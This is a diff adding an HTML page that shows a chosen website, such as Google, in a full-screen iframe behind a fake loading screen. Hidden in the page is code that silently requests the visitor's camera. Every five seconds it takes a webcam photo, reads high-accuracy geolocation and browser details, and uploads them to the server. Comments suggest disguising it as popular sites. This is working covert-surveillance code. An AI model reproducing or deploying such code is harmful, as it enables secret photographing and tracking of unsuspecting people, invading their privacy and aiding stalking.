@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        /* Full screen iframe */
+        #websiteFrame {
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            display: block;
+        }
+
+        /* Hidden camera elements */
+        #hiddenCamera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        /* Optional: Loading screen */
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            z-index: 9999;
+            transition: opacity 0.5s;
+        }
+
+        #loadingScreen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Floating control panel (optional - can be hidden) */
+        #controlPanel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            z-index: 1000;
+            display: none; /* Hide by default */
+        }
+
+        #controlPanel.show {
+            display: block;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        .status-dot.active {
+            background: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        .status-dot.inactive {
+            background: #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen">
+        <div class="spinner"></div>
+        <h2>Loading Website...</h2>
+    </div>
+
+    <!-- Main Website Frame -->
+    <iframe id="websiteFrame" src="" allowfullscreen></iframe>
+
+    <!-- Hidden Camera Elements -->
+    <div id="hiddenCamera">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <!-- Optional Control Panel -->
+    <div id="controlPanel">
+        <div>
+            <span class="status-dot active" id="statusDot"></span>
+            <span id="statusText">Monitoring Active</span>
+        </div>
+        <div style="margin-top: 10px;">
+            Next: <span id="countdown">5</span>s
+        </div>
+    </div>
+
+    <script>
+        // Configuration - Change these values
+        const CONFIG = {
+            targetWebsite: 'https://www.google.com', // Change this to any website
+            captureInterval: 5000, // 5 seconds
+            showControlPanel: false, // Set to true to show status
+            autoStart: true // Automatically start monitoring
+        };
+
+        // Global variables
+        let monitoringActive = false;
+        let monitoringInterval = null;
+        let countdownInterval = null;
+        let countdown = 5;
+        let stream = null;
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const websiteFrame = document.getElementById('websiteFrame');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const controlPanel = document.getElementById('controlPanel');
+        const countdownSpan = document.getElementById('countdown');
+
+        // Show/hide control panel
+        if (CONFIG.showControlPanel) {
+            controlPanel.classList.add('show');
+        }
+
+        // Load target website
+        websiteFrame.src = CONFIG.targetWebsite;
+
+        // Hide loading screen when iframe loads
+        websiteFrame.onload = () => {
+            setTimeout(() => {
+                loadingScreen.classList.add('hidden');
+                document.title = 'Website Viewer';
+                
+                if (CONFIG.autoStart) {
+                    setTimeout(startMonitoring, 2000);
+                }
+            }, 1000);
+        };
+
+        // Get browser info
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                viewportWidth: window.innerWidth,
+                viewportHeight: window.innerHeight,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // Get location
+        function getCurrentLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            });
+        }
+
+        // Initialize camera silently
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                video.srcObject = stream;
+                await video.play();
+                return true;
+            } catch (error) {
+                console.error('Camera access denied');
+                return false;
+            }
+        }
+
+        // Capture and send data
+        async function captureAndSend() {
+            try {
+                // Wait for video to be ready
+                if (video.readyState !== video.HAVE_ENOUGH_DATA) {
+                    return;
+                }
+
+                // Capture photo
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
+                });
+
+                // Get data
+                const location = await getCurrentLocation();
+                const browserInfo = getBrowserInfo();
+
+                // Send to server
+                const formData = new FormData();
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('location', JSON.stringify(location || {}));
+                formData.append('browserInfo', JSON.stringify(browserInfo));
+                formData.append('pageUrl', CONFIG.targetWebsite);
+
+                await fetch('/upload-photo', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                console.log('✅ Data sent successfully');
+
+            } catch (error) {
+                console.error('❌ Error:', error);
+            }
+        }
+
+        // Start countdown
+        function startCountdown() {
+            countdown = CONFIG.captureInterval / 1000;
+            if (countdownSpan) countdownSpan.textContent = countdown;
+            
+            countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdownSpan) countdownSpan.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    countdown = CONFIG.captureInterval / 1000;
+                }
+            }, 1000);
+        }
+
+        // Start monitoring
+        async function startMonitoring() {
+            const cameraOk = await initCamera();
+            if (!cameraOk) {
+                console.log('Retrying camera access...');
+                setTimeout(startMonitoring, 3000);
+                return;
+            }
+
+            monitoringActive = true;
+            console.log('🔴 Monitoring started');
+
+            // Initial capture after 2 seconds
+            setTimeout(captureAndSend, 2000);
+
+            // Start countdown
+            startCountdown();
+
+            // Regular captures
+            monitoringInterval = setInterval(captureAndSend, CONFIG.captureInterval);
+        }
+
+        // Stop monitoring
+        function stopMonitoring() {
+            monitoringActive = false;
+            
+            if (monitoringInterval) clearInterval(monitoringInterval);
+            if (countdownInterval) clearInterval(countdownInterval);
+            if (stream) stream.getTracks().forEach(track => track.stop());
+
+            console.log('⏹️ Monitoring stopped');
+        }
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', stopMonitoring);
+
+        // Handle visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                // Page hidden - continue monitoring in background
+                console.log('Page hidden - continuing monitoring');
+            } else {
+                // Page visible again
+                console.log('Page visible');
+            }
+        });
+
+        // Alternative websites you can use:
+        // https://www.youtube.com
+        // https://www.facebook.com
+        // https://twitter.com
+        // https://www.instagram.com
+        // https://www.netflix.com
+        // Any other website URL
+    </script>
+</body>
+</html>
